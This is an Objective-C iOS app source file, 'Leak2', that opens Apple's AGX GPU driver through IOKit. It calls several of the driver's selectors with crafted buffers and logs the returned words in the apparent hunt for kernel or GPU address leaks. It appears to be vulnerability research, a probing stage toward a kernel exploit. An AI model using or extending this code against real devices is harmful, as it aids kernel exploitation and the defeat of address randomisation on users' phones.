#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <string.h>
#import <stdlib.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt, ...) { va_list ap; va_start(ap,fmt); NSString *s=[[NSString alloc] initWithFormat:fmt arguments:ap]; va_end(ap); [gLog appendString:s]; [gLog appendString:@"\n"]; [gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil]; NSLog(@"[leak2] %@",s); }
static uint64_t rd64(const void *p){uint64_t v;memcpy(&v,p,8);return v;}
static kern_return_t call(io_connect_t c,uint32_t sel,const uint64_t *sv,uint32_t sc,void *si,size_t sis,uint64_t *so,uint32_t *soc,void *sout,size_t *sos){return IOConnectCallMethod(c,sel,sv,sc,si,sis,so,soc,sout,sos);}
static void sel0(io_connect_t c,const char *tag){uint8_t o[0x40];memset(o,0xCC,sizeof(o));size_t os=0x40;kern_return_t kr=call(c,0,NULL,0,NULL,0,NULL,NULL,o,&os);L(@"[sel0 %s] 0x%x osz=0x%zx",tag,kr,os);for(int i=0;i<8;i++)L(@"[sel0 %s] q%d=0x%llx",tag,i,(unsigned long long)rd64(o+i*8));}
static void run(void){
 io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("AGXAcceleratorG14P")); if(!svc){L(@"no svc");return;}
 io_connect_t c=0; kern_return_t kr=IOServiceOpen(svc,mach_task_self(),1,&c); IOObjectRelease(svc); L(@"[open] 0x%x",kr); if(kr)return;
 sel0(c,"base");
 uint8_t qin[0x410]; memset(qin,0,sizeof(qin)); *(uint32_t*)(qin+0x404)=1; uint8_t qout[0x10]; memset(qout,0,sizeof(qout)); size_t qos=0x10;
 kr=call(c,6,NULL,0,qin,0x410,NULL,NULL,qout,&qos); L(@"[sel6] 0x%x qid=%u serial=0x%llx",kr,*(uint32_t*)qout,(unsigned long long)rd64(qout+8));
 sel0(c,"after_queue");
 NSDictionary *pr=@{(__bridge NSString*)kIOSurfaceWidth:@1024,(__bridge NSString*)kIOSurfaceHeight:@4,(__bridge NSString*)kIOSurfaceBytesPerElement:@4,(__bridge NSString*)kIOSurfaceBytesPerRow:@4096,(__bridge NSString*)kIOSurfaceAllocSize:@0x4000};
 IOSurfaceRef sf=IOSurfaceCreate((__bridge CFDictionaryRef)pr); uint32_t sid=sf?IOSurfaceGetID(sf):0;
 uint8_t sin[0x100]; memset(sin,0,sizeof(sin)); *(uint32_t*)sin=0x82; *(uint32_t*)(sin+0x38)=sid; uint8_t sout[0x1000]; memset(sout,0,sizeof(sout)); size_t sos=0x1000;
 kr=call(c,8,NULL,0,sin,0x100,NULL,NULL,sout,&sos); L(@"[sel8] 0x%x gpuVA=0x%llx rid24=%u",kr,(unsigned long long)rd64(sout),*(uint32_t*)(sout+0x24));
 sel0(c,"after_res");
 uint64_t sv12[2]={0x4000,2}; uint8_t o12[0x10]; memset(o12,0,sizeof(o12)); size_t os12=0x10;
 kr=call(c,12,sv12,2,NULL,0,NULL,NULL,o12,&os12); L(@"[sel12] 0x%x addr=0x%llx id=%u",kr,(unsigned long long)rd64(o12),*(uint32_t*)(o12+0xc));
 sel0(c,"after_shmem");
 if(sf)CFRelease(sf); IOServiceClose(c); L(@"=== done ===");
}
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
 self.window=[[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds]; UIViewController *vc=[UIViewController new]; vc.view.backgroundColor=UIColor.blackColor;
 UITextView *tv=[[UITextView alloc] initWithFrame:vc.view.bounds]; tv.backgroundColor=UIColor.blackColor; tv.textColor=UIColor.greenColor; tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular]; tv.editable=NO; tv.text=@"Leak2\n";
 [vc.view addSubview:tv]; self.window.rootViewController=vc; [self.window makeKeyAndVisible]; [UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{ NSString *docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject]; gPath=[docs stringByAppendingPathComponent:@"leak2.log"]; gLog=[NSMutableString new]; run(); dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;}); });
 return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
